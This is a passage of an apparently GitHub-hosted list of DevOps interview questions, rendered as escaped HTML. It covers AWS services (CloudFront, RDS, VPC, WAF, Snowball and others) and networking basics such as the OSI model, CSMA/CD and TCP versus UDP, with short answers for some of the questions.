&lt;h4&gt;&lt;a id="user-content-cloudformation" class="anchor" aria-hidden="true" href="#cloudformation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CloudFormation&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is CloudFormation&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-costs" class="anchor" aria-hidden="true" href="#costs"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Costs&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Are you familiar with Cost Explorer tool? Have you used it? What for exactly?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-cloudfront" class="anchor" aria-hidden="true" href="#cloudfront"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;CloudFront&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain what is CloudFront and what is it used for&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the following
&lt;ul&gt;
&lt;li&gt;Origin&lt;/li&gt;
&lt;li&gt;Edge location&lt;/li&gt;
&lt;li&gt;Distribution&lt;/li&gt;
&lt;/ul&gt;
&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What delivery methods available for the user with CDN?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;True or False?. Objects are cached for the life of TTL&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;True
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is AWS Snowball?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A transport solution which was designed for transferring large amounts of data (petabyte-scale) into and out the AWS cloud.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-load-balancers" class="anchor" aria-hidden="true" href="#load-balancers"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Load Balancers&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What types of load balancers are supported in EC2 and what are they used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;Application LB - layer 7 traffic&lt;/li&gt;
&lt;li&gt;Network LB - ultra-high performances or static IP address&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Classic LB - low costs, good for test or dev environments
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;h5&gt;&lt;a id="user-content-aws-security" class="anchor" aria-hidden="true" href="#aws-security"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AWS Security&lt;/h5&gt;
&lt;details&gt;
&lt;summary&gt;What is the shared responsibility model? In other words, what AWS is responsible for and what the user is responsible for in regards to Security?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the AWS compliance program?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain what each of the following services is used for
&lt;ul&gt;
&lt;li&gt;AWS Inspector&lt;/li&gt;
&lt;li&gt;AWS Artifact&lt;/li&gt;
&lt;li&gt;AWS Shield&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is AWS WAF? Give an example of how it can used and describe what resources or services you can use it with&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What AWS VPN is used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between Site-to-Site VPN and Client VPN?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;True or False? AWS Inspector can perform both network and host assessments&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;True
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-aws-databases" class="anchor" aria-hidden="true" href="#aws-databases"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AWS Databases&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Amazon RDS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What are some features or benefits of using RDS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ol&gt;&lt;b&gt;
&lt;li&gt;Multi AZ - great for Disaster Recovery&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Read Replicas - for better performances
&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is AWS Redshift and how its different than RDS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What do you if you suspect AWS Redshift performs slowly?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;ul&gt;&lt;b&gt;
&lt;li&gt;You can confirm your suspicion by going to AWS Redshift console and see running queries graph. This should tell you if there are any long-running queries.&lt;/li&gt;
&lt;li&gt;If confirmed, you can query for running queries and cancel the irrelevant queries&lt;/li&gt;
&lt;li&gt;Check for connection leaks (query for running connections and include their IP)&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Check for table locks and kill irrelevant locking sessions
&lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What is EBS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is Amazon ElastiCache? For what cases it used?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Amazon Elasticache is a fully managed Redis or Memcached in-memory data store.&lt;br&gt;
It's great for use cases like two-tier web applications where the most frequently accesses data is stored in ElastiCache so response time is optimal.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is Amazon Aurora&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;A MySQL &amp;amp; Postgresql based relational database.
Great for use cases like two-tier web applications that has a MySQL or Postgresql database layer and you need automated backups for your application.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What "AWS Database Migration Service" is used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-aws-networking" class="anchor" aria-hidden="true" href="#aws-networking"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AWS Networking&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is VPC?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an Elastic IP address?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain Security Groups and Network ACLs&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h4&gt;&lt;a id="user-content-identify-the-service-or-tool" class="anchor" aria-hidden="true" href="#identify-the-service-or-tool"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Identify the service or tool&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What would you use for easily creating similar AWS environments/resources for different customers?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;CloudFormation
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Using which service, can you add user sign-up, sign-in and access control to mobile and web apps?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Cognito
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Which service would you use for building a website or web application?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Lightsail
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;Which tool would you use for choosing between Reserved instances or On-Demand instances?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Cost Explorer
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What would you use to check how many unassociated Elastic IP address you have?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Trusted Advisor
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What service allows you to transfer large amounts (Petabytes) of data in and out of the AWS cloud?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;AWS Snowball
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What provides a virtual network dedicated to your AWS account?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;VPC
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What you would use for having automated backups for an application that has MySQL database layer?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Amazon Aurora
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What would you use to migrate on-premise Oracle database to AWS?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;AWS Database Migration Service
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What would you use to check why certain EC2 instances were terminated?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;AWS CloudTrail
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-aws-misc" class="anchor" aria-hidden="true" href="#aws-misc"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AWS Misc&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;Explain what are the following services and give an use case example for each one them:
&lt;ul&gt;
&lt;li&gt;CloudTrail&lt;/li&gt;
&lt;li&gt;CloudWatch&lt;/li&gt;
&lt;li&gt;CloudSearch&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Explain what is AWS Lambda&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;h2&gt;&lt;a id="user-content-network" class="anchor" aria-hidden="true" href="#network"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Network&lt;/h2&gt;
&lt;p&gt;&lt;a name="user-content-network-beginner"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-baby-beginner-4" class="anchor" aria-hidden="true" href="#baby-beginner-4"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;g-emoji class="g-emoji" alias="baby" fallback-src="https://github.githubassets.com/images/icons/emoji/unicode/1f476.png"&gt;👶&lt;/g-emoji&gt; Beginner&lt;/h4&gt;
&lt;details&gt;
&lt;summary&gt;What is Ethernet?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a MAC address? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;When is this MAC address used?: ff:ff:ff:ff:ff:ff&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is an IP address?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain subnet mask and given an example&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a private IP address? What do we need it for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain the OSI model. What layers there are? What each layer is responsible for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Application: user end (HTTP is here)
Presentation: establishes context between application-layer entities (Encryption is here)
Session: establishes, manages and terminates the connections
Transport: transfers variable-length data sequences from a source to a destination host (TCP &amp;amp; UDP are here)
Network: transfers datagrams from one network to another (IP is here)
Data link: provides a link between two directly connected nodes (MAC is here)
Physical: the electrical and physical spec the data connection (Bits are here)
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;For each of the following determine to which OSI layer it belongs:
&lt;ul&gt;
&lt;li&gt;Error correction&lt;/li&gt;
&lt;li&gt;Packets routing&lt;/li&gt;
&lt;li&gt;Cables and electrical signals&lt;/li&gt;
&lt;li&gt;MAC address&lt;/li&gt;
&lt;li&gt;IP address&lt;/li&gt;
&lt;li&gt;Sessions between applications&lt;/li&gt;
&lt;li&gt;3 way handshake&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;What delivery schemes are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;Unitcast: One to one communication where there is one sender and one receiver.&lt;/p&gt;
&lt;p&gt;Broadcast: Sending a message to everyone in the network. The address ff:ff:ff:ff:ff:ff is used for broadcasting.
Two common protocols which use broadcast are ARP and DHCP.&lt;/p&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;Multicast: Sending a message to a group of subscribers. It can be one-to-many or many-to-many.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;What is CSMA/CD? Is it used in modern ethernet networks?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;p&gt;CSMA/CD stands for Carrier Sense Multiple Access / Collision Detection.
Its primarily focus it to manage access to shared medium/bus where only one host can transmit at a given point of time.&lt;/p&gt;
&lt;p&gt;CSMA/CD algorithm:&lt;/p&gt;
&lt;/b&gt;&lt;ol&gt;&lt;b&gt;
&lt;li&gt;Before sending a frame, it checks whether another host already transmitting a frame.&lt;/li&gt;
&lt;li&gt;If no one transmitting, it starts transmitting the frame.&lt;/li&gt;
&lt;li&gt;If two hosts transmitted at the same time, we have a collision.&lt;/li&gt;
&lt;li&gt;Both hosts stop sending the frame and they send to everyone a 'jam signal' notifying everyone that a collision occurred&lt;/li&gt;
&lt;li&gt;They are waiting for a random time before sending again&lt;/li&gt;
&lt;/b&gt;&lt;li&gt;&lt;b&gt;Once each host waited for a random time, they try to send the frame again and so the
&lt;/b&gt;&lt;/li&gt;&lt;/ol&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;Describe the following network devices and the difference between them:
&lt;ul&gt;
&lt;li&gt;router&lt;/li&gt;
&lt;li&gt;switch&lt;/li&gt;
&lt;li&gt;hub&lt;/li&gt;&lt;/ul&gt;&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;

&lt;details&gt;
&lt;summary&gt;How does a router works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is NAT?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a proxy? How it works? What do we need it for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is TCP? How it works? What is the 3 way handshake?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;How does SSL handshake work?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is the difference between TCP and UDP?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;p&gt;&lt;b&gt;TCP establishes a connection between the client and the server to guarantee the order of the packages, on the other hand, UDP does not establish a connection between client and server and doesn't handle package order. This makes UDP more lightweight than TCP and a perfect candidate for streaming services.
&lt;/b&gt;&lt;/p&gt;&lt;/details&gt;&lt;p&gt;&lt;/p&gt;
&lt;details&gt;
&lt;summary&gt;True or False? TCP is better than UDP&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What TCP/IP protocols are you familiar with?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Explain "default gateway"&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is ARP? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is TTL?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is DHCP? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is SSL tunneling? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is a socket? Where can you see the list of sockets in your system?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is IPv6? Why should we consider using it if we have IPv4?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is VLAN?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is MTU?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;True or False?. Ping is using UDP because it doesn't care about reliable connection&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is SDN?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is ICMP? What is it used for?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is NAT? How it works?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is latency?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;What is bandwidth?&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
&lt;details&gt;
&lt;summary&gt;Which factors affect network performances&lt;/summary&gt;&lt;br&gt;&lt;b&gt;
&lt;/b&gt;&lt;/details&gt;
